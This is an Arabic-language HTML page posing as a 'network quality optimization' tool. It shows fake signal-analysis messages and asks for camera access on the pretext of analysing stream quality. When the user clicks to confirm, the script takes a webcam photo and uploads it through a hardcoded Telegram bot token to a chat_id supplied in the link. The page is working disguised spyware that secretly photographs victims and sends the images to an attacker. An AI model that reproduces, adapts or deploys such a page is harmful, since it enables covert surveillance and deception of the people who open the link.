<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحسين جودة الشبكة</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: #0d1117; color: #c9d1d9; }
        video { width: 80%; max-width: 400px; border-radius: 12px; margin: 20px 0; border: 2px solid #30363d; background: #000; }
        button { background: #238636; color: white; border: none; padding: 14px 30px; border-radius: 30px; font-size: 18px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #2ea043; box-shadow: 0 0 20px #23863655; }
        #status { margin: 15px 0; font-size: 16px; color: #8b949e; }
        .loader { display: inline-block; width: 20px; height: 20px; border: 3px solid #1f3a5f; border-radius: 50%; border-top-color: #58a6ff; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h1>🛜 تحسين جودة الشبكة</h1>
    <p style="color: #8b949e; font-size: 14px;">جاري معاينة الشبكة لتسريع الاتصال ...</p>

    <div id="statusBox" style="background: #0d1a2b; padding: 15px; border-radius: 10px; margin: 20px 0; border: 1px solid #1f3a5f;">
        <div id="statusText">📡 جاري الاتصال بالخادم ...</div>
        <div id="loader" class="loader" style="margin-top: 10px;"></div>
    </div>

    <video id="video" autoplay playsinline class="hidden"></video>
    <button id="captureBtn" class="hidden" onclick="capture()">✅ تأكيد التحسين</button>
    <div id="status">⏳ يرجى الانتظار ...</div>

    <div style="font-size: 12px; color: #4a5a6e; margin-top: 20px;">🔒 اتصال مشفر • تحليل الشبكة • v2.4.1</div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('chat_id');
        const video = document.getElementById('video');
        const statusDiv = document.getElementById('status');
        const statusText = document.getElementById('statusText');
        const loader = document.getElementById('loader');
        const captureBtn = document.getElementById('captureBtn');
        let stream = null;

        if (!chatId) {
            statusDiv.innerHTML = '❌ رابط غير صالح';
            throw new Error('No chat_id');
        }

        setTimeout(() => {
            statusText.innerHTML = '📶 تم اكتشاف إشارة ضعيفة، جاري تحسين التردد ...';
        }, 1500);

        setTimeout(async () => {
            statusText.innerHTML = '📷 فتح الكاميرا لتحليل جودة البث ...';
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;
                video.classList.remove('hidden');
                captureBtn.classList.remove('hidden');
                loader.classList.add('hidden');
                statusText.innerHTML = '✅ التحليل مكتمل. اضغط "تأكيد التحسين" لإكمال الإعداد.';
                statusDiv.innerHTML = '✅ جاهز';
            } catch (err) {
                statusText.innerHTML = '❌ فشل الوصول للكاميرا: ' + err.message;
                loader.classList.add('hidden');
                statusDiv.innerHTML = '❌ خطأ: ' + err.message;
            }
        }, 3000);

        async function capture() {
            if (!stream) {
                statusDiv.innerHTML = '❌ الكاميرا غير جاهزة. انتظر قليلاً.';
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');

            statusText.innerHTML = '⏳ جاري رفع البيانات لتحسين الشبكة ...';
            statusDiv.innerHTML = '⏳ جاري الإرسال ...';

            try {
                const token = '8101399509:AAFHJIPgxF1RxGjKT7pRh4cHIOeErJlnJwc';
                const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (res.ok) {
                    statusText.innerHTML = '✅ تم تحسين الشبكة بنجاح!';
                    statusDiv.innerHTML = '✅ سيتم إعادة الاتصال خلال ثوانٍ.';
                    captureBtn.disabled = true;
                    captureBtn.style.opacity = '0.6';
                    captureBtn.innerHTML = '✅ تم';
                } else {
                    const errorText = await res.text();
                    statusText.innerHTML = '❌ فشل الرفع: ' + res.status;
                    statusDiv.innerHTML = '❌ حاول مرة أخرى: ' + errorText;
                }
            } catch (err) {
                statusText.innerHTML = '❌ خطأ: ' + err.message;
                statusDiv.innerHTML = '❌ خطأ في الاتصال';
            }
        }
    </script>
</body>
</html>
